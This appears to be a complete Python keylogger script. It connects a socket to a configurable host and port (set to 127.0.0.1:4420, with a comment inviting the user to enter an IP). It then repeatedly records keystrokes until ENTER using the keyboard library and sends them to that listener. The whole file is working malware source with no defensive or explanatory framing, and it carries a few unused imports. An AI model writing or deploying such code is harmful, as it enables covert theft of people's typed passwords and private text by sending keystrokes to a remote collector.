#!/usr/bin/env python3
from distutils.sysconfig import get_config_h_filename
from gettext import dgettext
import subprocess,socket,os
import time,keyboard
from matplotlib.pyplot import get_figlabels
HOST = '127.0.0.1'
PORT = 4420
# Configure socket connection
z = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
z.connect((HOST, PORT))

def logging():
    keys = keyboard.record(until ='ENTER')
    #t = keyboard.play(keys)
    keyz = str(keys)
    #print('keys pressed before ENTER')
    #print(keys)
    #logging()
    # Enter IP and Port here

    # Wake up
    z.send(keyz.encode())
    logging()
    

logging()

